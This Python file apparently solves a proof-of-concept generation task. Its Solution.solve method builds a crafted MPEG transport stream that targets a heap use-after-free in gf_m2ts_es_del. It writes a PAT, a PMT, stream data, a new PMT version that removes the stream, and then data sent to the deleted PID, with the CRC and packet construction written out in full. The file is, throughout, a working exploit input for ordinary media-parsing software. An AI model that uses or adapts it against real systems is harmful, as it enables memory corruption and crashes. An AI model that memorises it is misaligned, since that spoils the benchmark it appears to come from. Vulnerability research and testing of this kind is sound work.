import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Targeting Heap Use After Free in gf_m2ts_es_del.
        Strategy:
        1. Create PAT pointing to a PMT.
        2. Create PMT defining an Elementary Stream (ES).
        3. Send data for that ES.
        4. Send updated PMT (new version) removing that ES. This triggers gf_m2ts_es_del.
        5. Send data for the deleted ES immediately after to trigger UAF or crash during deletion cleanup.
        """
        
        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    c31 = (crc >> 31) & 1
                    crc = (crc << 1) & 0xFFFFFFFF
                    if c31 ^ bit:
                        crc ^= 0x04C11DB7
            return crc

        def make_ts_packet(pid, payload_unit_start, continuity_counter, payload):
            # Sync byte
            header = bytearray([0x47])
            
            # TEI(1), PUSI(1), Prio(1), PID(5)
            val = (0x40 if payload_unit_start else 0x00) | ((pid >> 8) & 0x1F)
            header.append(val)
            
            # PID(8)
            header.append(pid & 0xFF)
            
            # Scram(2), Adapt(2), Counter(4)
            # Adapt 01 = Payload only
            header.append(0x10 | (continuity_counter & 0x0F))
            
            packet = header + payload
            
            # Padding with 0xFF
            if len(packet) < 188:
                packet += b'\xFF' * (188 - len(packet))
            return packet[:188]

        # Constants
        PMT_PID = 0x100
        ES_PID = 0x200
        
        packets = []

        # ---------------------------------------------------------
        # Packet 1: PAT
        # Defines Program 1 -> PMT_PID
        # ---------------------------------------------------------
        pat_section = bytearray()
        pat_section.append(0x00) # Table ID (PAT)
        # Length placeholder
        pat_section += b'\xB0\x00' 
        pat_section += b'\x00\x01' # TS ID
        pat_section += b'\xC1' # Ver 0, Cur 1
        pat_section += b'\x00' # Section 0
        pat_section += b'\x00' # Last Section 0
        
        # Program 1 -> PMT PID
        pat_section += b'\x00\x01' # Prog Num
        pat_section += struct.pack('>H', 0xE000 | PMT_PID)
        
        # Fix Length: Total - 3 bytes (TableID + 2 len bytes)
        # Section len = Header(5) + Prog(4) + CRC(4) = 13
        # Field value = 13
        pat_len = len(pat_section) + 4 - 3
        pat_section[1] = 0xB0 | ((pat_len >> 8) & 0x0F)
        pat_section[2] = pat_len & 0xFF
        
        pat_section += struct.pack('>I', mpeg_crc32(pat_section))
        
        # Pointer field 0x00
        packets.append(make_ts_packet(0, True, 0, b'\x00' + pat_section))

        # ---------------------------------------------------------
        # Packet 2: PMT (Version 0)
        # Defines ES_PID with Stream Type 0x11 (MPEG4 Text/Scene)
        # ---------------------------------------------------------
        pmt_section = bytearray()
        pmt_section.append(0x02) # Table ID (PMT)
        pmt_section += b'\xB0\x00' # Len placeholder
        pmt_section += b'\x00\x01' # Prog Num
        pmt_section += b'\xC1' # Ver 0, Cur 1
        pmt_section += b'\x00' # Sec 0
        pmt_section += b'\x00' # Last Sec 0
        pmt_section += struct.pack('>H', 0xE000 | ES_PID) # PCR PID
        pmt_section += b'\xF0\x00' # Prog Info Len 0
        
        # ES Definition
        pmt_section += b'\x11' # Stream Type (MPEG-4)
        pmt_section += struct.pack('>H', 0xE000 | ES_PID)
        pmt_section += b'\xF0\x00' # ES Info Len 0
        
        # Fix Length
        pmt_len = len(pmt_section) + 4 - 3
        pmt_section[1] = 0xB0 | ((pmt_len >> 8) & 0x0F)
        pmt_section[2] = pmt_len & 0xFF
        
        pmt_section += struct.pack('>I', mpeg_crc32(pmt_section))
        
        packets.append(make_ts_packet(PMT_PID, True, 0, b'\x00' + pmt_section))

        # ---------------------------------------------------------
        # Packet 3: Data for ES_PID
        # Initialize stream context
        # ---------------------------------------------------------
        packets.append(make_ts_packet(ES_PID, True, 0, b'\x00\x00\x01\x00' + b'\xAA'*100))

        # ---------------------------------------------------------
        # Packet 4: PMT (Version 1)
        # Removes ES_PID (Implicit Deletion)
        # ---------------------------------------------------------
        pmt2_section = bytearray()
        pmt2_section.append(0x02) # Table ID
        pmt2_section += b'\xB0\x00' # Len placeholder
        pmt2_section += b'\x00\x01' # Prog Num
        pmt2_section += b'\xC3' # Ver 1, Cur 1 (Update!)
        pmt2_section += b'\x00' # Sec 0
        pmt2_section += b'\x00' # Last Sec 0
        pmt2_section += struct.pack('>H', 0xE000 | ES_PID) # PCR PID
        pmt2_section += b'\xF0\x00' # Prog Info Len 0
        
        # No ES Definition -> Deletion of ES_PID
        
        # Fix Length
        pmt2_len = len(pmt2_section) + 4 - 3
        pmt2_section[1] = 0xB0 | ((pmt2_len >> 8) & 0x0F)
        pmt2_section[2] = pmt2_len & 0xFF
        
        pmt2_section += struct.pack('>I', mpeg_crc32(pmt2_section))
        
        packets.append(make_ts_packet(PMT_PID, True, 1, b'\x00' + pmt2_section))

        # ---------------------------------------------------------
        # Packet 5: Data for ES_PID (Use After Free)
        # Sending data to a deleted PID
        # ---------------------------------------------------------
        packets.append(make_ts_packet(ES_PID, False, 1, b'\xBB' * 184))

        # ---------------------------------------------------------
        # Packet 6: Stuffing to match 1128 bytes
        # ---------------------------------------------------------
        packets.append(make_ts_packet(0x1FFF, False, 0, b'\xFF' * 184))

        return b''.join(packets)